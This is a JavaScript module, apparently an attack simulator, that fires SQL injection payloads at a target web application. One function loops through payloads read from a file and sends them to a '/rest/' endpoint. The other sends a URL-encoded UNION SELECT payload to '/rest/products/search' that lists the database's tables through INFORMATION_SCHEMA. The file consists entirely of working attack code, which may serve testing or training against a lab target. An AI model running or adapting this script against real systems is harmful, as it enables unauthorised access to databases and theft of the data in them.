const  ora = require('ora')
const chalk = require('chalk');
const logSymbols= require('log-symbols');
const { http } = require('../lib/request')
const fs = require('fs');

const threshold = 100;

async function basic1(targetURL){

    const spinner = ora('Running basic unsuccessful sql injection attack').start();

    await new Promise(r => setTimeout(r, 1000));
    let sql_payloads = fs.readFileSync(__dirname + '/sqli-payloads.txt', {encoding:'utf8'});
        sql_payloads = sql_payloads.split("\n");

    
    for (const payload of sql_payloads) {
        spinner.text = 'Basic SQL Injection: ' + payload;
        await http().get(targetURL + '/rest/',{
            "q": payload
            
        })
        await new Promise(r => setTimeout(r, 200));
    }

    spinner.stopAndPersist({
                    symbol: logSymbols.success,
                    text: 'Basic SQL injection attack - done',
                });
   
}

async function exploit(targetURL){

    const spinner = ora('Running successful sql injection attack').start();

    await new Promise(r => setTimeout(r, 500));
    payload = "qwert%27))%20UNION%20SELECT%20TABLE_NAME,%202,%203,4,5,6,7,8,9%20FROM%20INFORMATION_SCHEMA.TABLES%20%23"
    spinner.text = 'Successful SQL Injection: ' + payload;
    await http().get(targetURL + '/rest/products/search',{
        "q": payload
        
    })
    await new Promise(r => setTimeout(r, 500));
    spinner.stopAndPersist({
        symbol: logSymbols.success,
        text: 'Successful SQL injection attack - done',
    });
}

module.exports = { basic1, exploit }